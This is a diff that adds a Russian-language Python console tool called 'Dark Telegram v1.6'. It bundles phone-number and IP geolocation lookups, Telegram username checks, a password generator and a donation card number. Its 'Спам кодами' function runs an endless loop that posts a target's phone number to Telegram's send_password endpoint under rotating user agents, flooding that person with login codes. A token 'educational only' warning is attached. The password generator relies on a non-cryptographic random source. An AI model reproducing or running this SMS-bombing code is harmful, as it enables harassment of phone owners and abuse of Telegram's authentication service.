@@ -1,0 +1,500 @@
+import requests
+from fake_useragent import UserAgent
+from colorama import init, Fore, Back, Style
+import os
+import sys
+import random
+import string
+import re
+from datetime import datetime
+import pytz
+import socket
+
+# Инициализация цветов
+init(autoreset=True)
+
+# Пароль для доступа (ДОБАВЛЕНО)
+PASSWORD = "Key_21"
+
+def clear_screen():
+    """Очистка экрана консоли"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_banner():
+    """Вывод красивого баннера"""
+    banner = f"""
+{Fore.RED}╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗╔═╗╦  ╔╦╗
+{Fore.RED} ║ ║ ║╠╦╝ ║ ❤️══╣ ║ ║ ║║   ║ 
+{Fore.RED} ╩ ╚═╝╩╚═ ╩ ╩ ╩ ╩ ╚═╝╩═╝ ╩ 
+{Fore.WHITE}{Back.BLACK}• Dark Telegram v1.6 •
+{Style.RESET_ALL}"""
+    print(banner)
+
+def format_country(data):
+    """Форматирование данных о стране"""
+    if not isinstance(data, dict):
+        return str(data)
+    return f"{data.get('name', 'неизвестно')} ({data.get('english', 'нет данных')})"
+
+def format_region(data):
+    """Форматирование данных о регионе"""
+    if not isinstance(data, dict):
+        return str(data)
+    return f"{data.get('name', 'неизвестно')} ({data.get('okrug', 'нет данных')})"
+
+def phone_lookup():
+    """Поиск информации по номеру телефона"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[1] {Fore.WHITE}Поиск по номеру телефона")
+    print(f"{Fore.CYAN}="*40)
+    
+    phone = input(f"{Fore.YELLOW}Введите номер телефона: ").strip()
+    
+    if not phone.isdigit():
+        print(f"{Fore.RED}❌ Ошибка: номер должен содержать только цифры.")
+        return
+    
+    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
+    
+    try:
+        headers = {"User-Agent": UserAgent().random}
+        response = requests.get(url, headers=headers, timeout=10)
+        response.raise_for_status()
+        
+        if not response.text.strip():
+            print(f"{Fore.RED}❌ Сервер вернул пустой ответ.")
+            return
+        
+        data = response.json()
+        
+        print(f"\n{Fore.CYAN}📋 Результат проверки номера:")
+        print(f"{Fore.CYAN}="*40)
+        print(f"{Fore.WHITE}📞 Номер: {Fore.YELLOW}{phone}")
+        print(f"{Fore.CYAN}-"*40)
+        print(f"{Fore.WHITE}🌍 Страна: {Fore.YELLOW}{format_country(data.get('country', 'неизвестно'))}")
+        print(f"{Fore.WHITE}🏢 Оператор: {Fore.YELLOW}{data.get('operator', 'неизвестно')}")
+        print(f"{Fore.WHITE}📍 Регион: {Fore.YELLOW}{format_region(data.get('region', 'неизвестно'))}")
+        print(f"{Fore.CYAN}="*40)
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Ошибка: {e}")
+
+def test_attack():
+    """Тестовая атака на номер"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[2] {Fore.WHITE}Спам кодами")
+    print(f"{Fore.RED}⚠ Предупреждение: Это только для образовательных целей!")
+    print(f"{Fore.CYAN}="*40)
+    
+    try:
+        number = input(f"{Fore.YELLOW}Введите номер телефона: ")
+        if not number.isdigit():
+            print(f"{Fore.RED}❌ Номер должен содержать только цифры!")
+            return
+            
+        count = 0
+        headers = {'User-Agent': UserAgent().random}
+        
+        input(f"{Fore.YELLOW}Нажмите ENTER чтобы начать...")
+        
+        while True:
+            try:
+                requests.post('https://my.telegram.org/auth/send_password', 
+                           headers=headers, 
+                           data={'phone': number})
+                
+                requests.get('https://telegram.org/support?setln=ru', 
+                          headers=headers)
+                
+                count += 1
+                print(f"{Fore.GREEN}[+] Запрос #{count} отправлен на номер {number}")
+                
+            except Exception as e:
+                print(f"{Fore.RED}❌ Ошибка: {e}")
+                break
+                
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}⏹ Атака остановлена пользователем")
+
+def advanced_phone_lookup():
+    """Расширенный поиск информации по номеру телефона"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[3] {Fore.WHITE}Расширенный поиск по номеру")
+    print(f"{Fore.CYAN}="*50)
+    
+    phone = input(f"{Fore.YELLOW}Введите номер телефона (без '+'): ").strip()
+    
+    if not phone.isdigit():
+        print(f"{Fore.RED}❌ Ошибка: номер должен содержать только цифры.")
+        return
+    
+    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
+    
+    try:
+        headers = {"User-Agent": UserAgent().random}
+        
+        print(f"\n{Fore.YELLOW}⌛ Запрашиваю информацию...")
+        response = requests.get(url, headers=headers, timeout=10)
+        response.raise_for_status()
+        
+        if not response.text.strip():
+            print(f"{Fore.RED}❌ Сервер вернул пустой ответ.")
+            return
+        
+        data = response.json()
+        
+        print(f"\n{Fore.CYAN}📋 Результат проверки номера:")
+        print(f"{Fore.CYAN}="*50)
+        print(f"{Fore.WHITE}📞 Номер: {Fore.YELLOW}{phone}")
+        print(f"{Fore.CYAN}-"*50)
+        
+        # Основная информация
+        print(f"{Fore.WHITE}🌍 Страна: {Fore.YELLOW}{data.get('country', {}).get('name', 'неизвестно')}")
+        print(f"{Fore.WHITE}🏙 Регион: {Fore.YELLOW}{data.get('region', {}).get('name', 'неизвестно')}")
+        print(f"{Fore.WHITE}🏢 Округ: {Fore.YELLOW}{data.get('okrug', 'неизвестно')}")
+        print(f"{Fore.WHITE}🏘 Город: {Fore.YELLOW}{data.get('city', 'неизвестно')}")
+        
+        # Информация об операторе
+        oper_info = data.get('oper', {})
+        if isinstance(oper_info, dict):
+            print(f"{Fore.WHITE}📱 Оператор: {Fore.YELLOW}{oper_info.get('name', 'неизвестно')}")
+        else:
+            print(f"{Fore.WHITE}📱 Оператор: {Fore.YELLOW}{oper_info if oper_info else 'неизвестно'}")
+        
+        # Дополнительная информация
+        print(f"{Fore.WHITE}⏰ Часовой пояс: {Fore.YELLOW}{data.get('timezone', 'неизвестно')}")
+        print(f"{Fore.WHITE}🇺🇳 Код страны: {Fore.YELLOW}{data.get('country', {}).get('id', 'неизвестно')}")
+        print(f"{Fore.WHITE}🏷 Код региона: {Fore.YELLOW}{data.get('region', {}).get('id', 'неизвестно')}")
+        
+        print(f"{Fore.CYAN}="*50)
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Ошибка: {e}")
+
+def generate_password():
+    """Генератор сложных паролей"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[4] {Fore.WHITE}Генератор паролей")
+    print(f"{Fore.CYAN}="*40)
+    
+    length = random.randint(8, 12)
+    characters = string.ascii_letters + string.digits + "!@#$%^&*"
+    password = ''.join(random.choice(characters) for _ in range(length))
+    
+    print(f"\n{Fore.YELLOW}🔑 Сгенерированный пароль:")
+    print(f"{Fore.CYAN}="*40)
+    print(f"{Fore.WHITE}{Back.BLACK}{Style.BRIGHT}{password}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}="*40)
+    print(f"{Fore.WHITE}Длина пароля: {Fore.YELLOW}{length} символов")
+    print(f"{Fore.WHITE}Сложность: {Fore.YELLOW}Высокая")
+    print(f"{Fore.CYAN}="*40)
+
+def show_credits():
+    """Информация о разработчике"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[5] {Fore.WHITE}Разработчик")
+    print(f"{Fore.CYAN}="*40)
+    
+    credits = f"""
+{Fore.YELLOW}╔════════════════════════════════╗
+{Fore.YELLOW}║       {Fore.WHITE}Информация о разработчике{Fore.YELLOW}      ║
+{Fore.YELLOW}╠════════════════════════════════╣
+{Fore.YELLOW}║ {Fore.WHITE}Скрипт создал: {Fore.GREEN}Artem             {Fore.YELLOW}║
+{Fore.YELLOW}║ {Fore.WHITE}Telegram: {Fore.CYAN}@minesevenG        {Fore.YELLOW}║
+{Fore.YELLOW}╚════════════════════════════════╝
+{Style.RESET_ALL}"""
+    print(credits)
+    print(f"{Fore.CYAN}="*40)
+
+def show_donate():
+    """Показать информацию для донатов"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[6] {Fore.WHITE}Поддержать разработчика")
+    print(f"{Fore.CYAN}="*40)
+    
+    donate_info = f"""
+{Fore.YELLOW}╔════════════════════════════════╗
+{Fore.YELLOW}║   {Fore.WHITE}Поддержать разработчика{Fore.YELLOW}            ║
+{Fore.YELLOW}╠════════════════════════════════╣
+{Fore.YELLOW}║ {Fore.WHITE}Карта: {Fore.GREEN}2200701204900481      {Fore.YELLOW}        ║
+{Fore.YELLOW}║ {Fore.WHITE}Банк: {Fore.CYAN}Т-Банк               {Fore.YELLOW}          ║
+{Fore.YELLOW}╚════════════════════════════════╝
+{Style.RESET_ALL}"""
+    print(donate_info)
+    print(f"{Fore.CYAN}="*40)
+    print(f"{Fore.WHITE}Спасибо за вашу поддержку!")
+    print(f"{Fore.CYAN}="*40)
+
+def check_telegram_user():
+    """Проверка существования пользователя в Telegram"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[7] {Fore.WHITE}Проверка пользователя в Telegram")
+    print(f"{Fore.CYAN}="*50)
+    
+    username = input(f"{Fore.YELLOW}Введите юзернейм (с @ или без): ").strip().replace("@", "")
+    
+    if not username:
+        print(f"{Fore.RED}❌ Вы не ввели юзернейм!")
+        return
+    
+    url = f"https://t.me/{username}"
+    headers = {'User-Agent': UserAgent().random}
+    
+    try:
+        print(f"\n{Fore.YELLOW}🔍 Проверяем @{username}...")
+        response = requests.get(url, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            if "tgme_username_link" in response.text or "tgme_page_title" in response.text:
+                print(f"\n{Fore.GREEN}✅ Пользователь @{username} существует!")
+                print(f"{Fore.CYAN}="*50)
+                print(f"{Fore.WHITE}🌐 Ссылка на аккаунт: {Fore.CYAN}{url}")
+                print(f"{Fore.CYAN}="*50)
+            else:
+                print(f"\n{Fore.RED}❌ Пользователь @{username} не найден!")
+        else:
+            print(f"\n{Fore.RED}❌ Ошибка запроса (код {response.status_code})")
+            
+    except requests.ConnectionError:
+        print(f"\n{Fore.RED}⚠ Ошибка подключения к интернету")
+    except Exception as e:
+        print(f"\n{Fore.RED}⚠ Ошибка: {str(e)}")
+
+def ip_lookup():
+    """Поиск информации по IP-адресу"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[8] {Fore.WHITE}Поиск по IP-адресу")
+    print(f"{Fore.CYAN}="*50)
+    
+    def get_ip_info(ip):
+        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,city,org,timezone,query"
+        headers = {"User-Agent": UserAgent().random}
+        
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            data = response.json()
+            
+            if data.get("status") != "success":
+                error = data.get("message", "Неизвестная ошибка")
+                print(f"{Fore.RED}❌ Ошибка: {error}")
+                return None
+            
+            timezone = data.get("timezone", "Неизвестно")
+            local_time = "Неизвестно"
+            if timezone != "Неизвестно":
+                try:
+                    tz = pytz.timezone(timezone)
+                    local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
+                except pytz.UnknownTimeZoneError:
+                    pass
+            
+            return {
+                "🌐 IP-адрес": data.get("query", ip),
+                "🏳️ Страна": data.get("country", "Неизвестно"),
+                "🏙️ Город": data.get("city", "Неизвестно"),
+                "🏢 Организация": data.get("org", "Неизвестно"),
+                "⏰ Часовой пояс": timezone,
+                "🕒 Местное время": local_time,
+            }
+        
+        except requests.exceptions.RequestException as e:
+            print(f"{Fore.RED}🚫 Ошибка при запросе: {e}")
+            return None
+
+    print(f"{Fore.YELLOW}🔍 Введите IP-адрес (например: 11.111.111.111):")
+    ip = input().strip()
+    
+    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip):
+        print(f"{Fore.RED}❌ Неверный формат IP! Пример: 11.111.111.111")
+        return
+    
+    print(f"\n{Fore.YELLOW}⌛ Запрашиваю информацию...\n")
+    
+    info = get_ip_info(ip)
+    if info:
+        print(f"{Fore.CYAN}📋 Результаты поиска по IP:")
+        print(f"{Fore.CYAN}="*50)
+        for key, value in info.items():
+            print(f"{Fore.WHITE}{key}: {Fore.YELLOW}{value}")
+        print(f"{Fore.CYAN}="*50)
+    else:
+        print(f"{Fore.RED}❌ Не удалось получить данные. Проверьте IP и интернет.")
+
+def check_my_ip():
+    """Проверка текущего IP-адреса и VPN статуса"""
+    clear_screen()
+    print_banner()
+    print(f"\n{Fore.GREEN}[9] {Fore.WHITE}Проверить мой IP")
+    print(f"{Fore.CYAN}="*50)
+    
+    def get_local_ip():
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            return local_ip
+        except:
+            return "Не удалось определить"
+    
+    def get_ip_info(use_vpn_check=True):
+        try:
+            # Получаем текущий IP
+            response = requests.get('https://api.ipify.org?format=json', timeout=5)
+            current_ip = response.json()['ip']
+            
+            # Получаем информацию об IP
+            ip_info = requests.get(f'http://ip-api.com/json/{current_ip}?fields=66846719', timeout=5).json()
+            
+            # Проверяем VPN/Proxy
+            vpn_detected = False
+            protection_level = "Средняя"
+            vpn_type = "Не обнаружен"
+            
+            if use_vpn_check:
+                # Проверяем признаки VPN/Proxy
+                if ip_info.get('proxy') or ip_info.get('hosting'):
+                    vpn_detected = True
+                    vpn_type = "VPN/Proxy обнаружен"
+                    protection_level = "Высокая"
+                elif ip_info.get('mobile'):
+                    vpn_type = "Мобильное соединение"
+                    protection_level = "Низкая"
+                else:
+                    vpn_type = "Прямое соединение"
+                    protection_level = "Средняя"
+            
+            return {
+                'current_ip': current_ip,
+                'isp': ip_info.get('isp', 'Неизвестно'),
+                'org': ip_info.get('org', 'Неизвестно'),
+                'country': ip_info.get('country', 'Неизвестно'),
+                'city': ip_info.get('city', 'Неизвестно'),
+                'vpn_detected': vpn_detected,
+                'vpn_type': vpn_type,
+                'protection_level': protection_level
+            }
+            
+        except Exception as e:
+            return {'error': str(e)}
+    
+    # Локальный IP
+    print(f"\n{Fore.WHITE}🖥️ Ваш локальный IP: {Fore.YELLOW}{get_local_ip()}")
+    
+    # Текущее соединение
+    print(f"\n{Fore.YELLOW}⌛ Анализ текущего соединения...\n")
+    info = get_ip_info()
+    
+    if 'error' in info:
+        print(f"{Fore.RED}❌ Ошибка: {info['error']}")
+    else:
+        print(f"{Fore.CYAN}📋 Информация о вашем IP:")
+        print(f"{Fore.CYAN}="*50)
+        print(f"{Fore.WHITE}🌐 Внешний IP: {Fore.YELLOW}{info['current_ip']}")
+        print(f"{Fore.WHITE}📡 Провайдер: {Fore.YELLOW}{info['isp']}")
+        print(f"{Fore.WHITE}🏢 Организация: {Fore.YELLOW}{info['org']}")
+        print(f"{Fore.WHITE}🌍 Страна: {Fore.YELLOW}{info['country']}")
+        print(f"{Fore.WHITE}🏙️ Город: {Fore.YELLOW}{info['city']}")
+        print(f"{Fore.WHITE}🛡️ Статус VPN: {Fore.YELLOW}{info['vpn_type']}")
+        print(f"{Fore.WHITE}🔒 Уровень защиты: {Fore.YELLOW}{info['protection_level']}")
+        print(f"{Fore.CYAN}="*50)
+    
+    # Сравнение с VPN и без
+    choice = input(f"\n{Fore.YELLOW}Хотите сравнить соединение с VPN и без? (y/n): ").lower()
+    if choice == 'y':
+        try:
+            print(f"\n{Fore.YELLOW}⌛ Проверка без VPN...")
+            normal_info = get_ip_info()
+            
+            input(f"\n{Fore.YELLOW}Подключите VPN и нажмите Enter для продолжения...")
+            
+            print(f"\n{Fore.YELLOW}⌛ Проверка с VPN...")
+            vpn_info = get_ip_info()
+            
+            print(f"\n{Fore.CYAN}📊 Результаты сравнения:")
+            print(f"{Fore.CYAN}="*50)
+            print(f"{Fore.WHITE}🔹 Без VPN:")
+            print(f"{Fore.WHITE}IP: {Fore.YELLOW}{normal_info['current_ip']}")
+            print(f"{Fore.WHITE}Страна: {Fore.YELLOW}{normal_info['country']}")
+            print(f"{Fore.WHITE}Город: {Fore.YELLOW}{normal_info['city']}")
+            print(f"{Fore.WHITE}Статус VPN: {Fore.YELLOW}{normal_info['vpn_type']}")
+            
+            print(f"\n{Fore.WHITE}🔸 С VPN:")
+            print(f"{Fore.WHITE}IP: {Fore.YELLOW}{vpn_info['current_ip']}")
+            print(f"{Fore.WHITE}Страна: {Fore.YELLOW}{vpn_info['country']}")
+            print(f"{Fore.WHITE}Город: {Fore.YELLOW}{vpn_info['city']}")
+            print(f"{Fore.WHITE}Статус VPN: {Fore.YELLOW}{vpn_info['vpn_type']}")
+            print(f"{Fore.WHITE}Уровень защиты: {Fore.YELLOW}{vpn_info['protection_level']}")
+            print(f"{Fore.CYAN}="*50)
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка при сравнении: {e}")
+    
+    print(f"\n{Fore.GREEN}✅ Проверка завершена!")
+
+def exit_program():
+    """Выход из программы"""
+    print(f"\n{Fore.GREEN}🖤 Спасибо за использование Dark Telegram! До свидания!{Style.RESET_ALL}")
+    sys.exit()
+
+def main_menu():
+    """Главное меню"""
+    while True:
+        clear_screen()
+        print_banner()
+        
+        print(f"\n{Fore.MAGENTA}Главное меню:")
+        print(f"{Fore.GREEN}[1] {Fore.WHITE}Поиск по номеру")
+        print(f"{Fore.GREEN}[2] {Fore.WHITE}Спам кодами")
+        print(f"{Fore.GREEN}[3] {Fore.WHITE}Расширенный поиск")
+        print(f"{Fore.GREEN}[4] {Fore.WHITE}Генератор паролей")
+        print(f"{Fore.GREEN}[5] {Fore.WHITE}Разработчик")
+        print(f"{Fore.GREEN}[6] {Fore.WHITE}Поддержать разработчика")
+        print(f"{Fore.GREEN}[7] {Fore.WHITE}Проверка пользователя в TG")
+        print(f"{Fore.GREEN}[8] {Fore.WHITE}Поиск по IP")
+        print(f"{Fore.GREEN}[9] {Fore.WHITE}Проверить мой IP")
+        print(f"{Fore.GREEN}[10] {Fore.WHITE}Выход")
+        
+        choice = input(f"\n{Fore.YELLOW}Выберите опцию (1-10): ").strip()
+        
+        if choice == "1":
+            phone_lookup()
+        elif choice == "2":
+            test_attack()
+        elif choice == "3":
+            advanced_phone_lookup()
+        elif choice == "4":
+            generate_password()
+        elif choice == "5":
+            show_credits()
+        elif choice == "6":
+            show_donate()
+        elif choice == "7":
+            check_telegram_user()
+        elif choice == "8":
+            ip_lookup()
+        elif choice == "9":
+            check_my_ip()
+        elif choice == "10":
+            exit_program()
+        else:
+            print(f"{Fore.RED}❌ Неверный выбор. Попробуйте снова.")
+        
+        input(f"\n{Fore.YELLOW}Нажмите ENTER чтобы продолжить...")
+
+if __name__ == "__main__":
+    # Проверка пароля (ДОБАВЛЕНО)
+    clear_screen()
+    print_banner()
+    password_input = input(f"{Fore.YELLOW}Введите пароль для доступа: ").strip()
+    if password_input != PASSWORD:
+        print(f"{Fore.RED}❌ Неверный пароль! Выход...")
+        sys.exit()
+    print(f"{Fore.GREEN}✅ Доступ разрешен!")
+    input(f"{Fore.YELLOW}Нажмите ENTER чтобы продолжить...")
+    main_menu()  # Запуск основного меню
